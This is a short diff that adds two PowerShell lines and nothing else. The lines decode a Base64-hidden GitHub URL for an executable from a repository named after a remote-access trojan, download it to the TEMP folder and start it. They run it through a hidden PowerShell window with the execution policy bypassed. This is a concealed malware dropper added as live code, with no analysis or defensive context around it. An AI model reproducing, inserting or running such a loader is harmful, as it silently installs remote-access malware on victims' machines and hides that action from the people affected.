@@ -1,0 +1,2 @@
+$command = "iex `"[System.Net.ServicePointManager]::SecurityProtocol = 3072;`$u=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2tvcnBpMjIyMy9CSUxELVdFQlJBVC1EQ1JBVC9yYXcvcmVmcy9oZWFkcy9tYWluL1Jlc3VsdC5leGU='));`$p=`"`$env:TEMP\res.exe`";Invoke-WebRequest -Uri `$u -OutFile `$p;Start-Process `$p`""
+Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden
